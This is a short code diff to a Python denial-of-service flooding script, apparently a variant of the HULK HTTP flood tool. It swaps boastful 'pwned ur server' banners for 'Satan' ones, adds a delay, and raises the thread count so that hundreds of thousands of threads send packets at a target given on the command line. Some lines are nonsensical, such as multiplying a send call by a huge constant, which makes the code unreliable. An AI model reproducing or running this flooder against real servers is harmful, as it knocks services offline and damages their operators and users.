@@ -88,10 +88,13 @@ def httpcall(url):
 			s.sendto(bytes, (url, 80)) * 109951162777600
 			s.settimeout(10)
 			pkt_count += 3
+			time.sleep(.1)
+		
+			
 			
 	except Exception:
 			#print e.code
-			print 'Ryan pwned ur server!!'
+			print 'Satan Pwned Ur Server!'
 			code=500
 
 	
@@ -113,14 +116,14 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- HULK Attack Started Bitch 1337 --"
+		print "-- Satans Terabit HUB --"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
 		
 		
-		for i in range(9999):
+		for i in xrange(666 * 666):
 			t = HTTPThread()
 			t.start()
 		
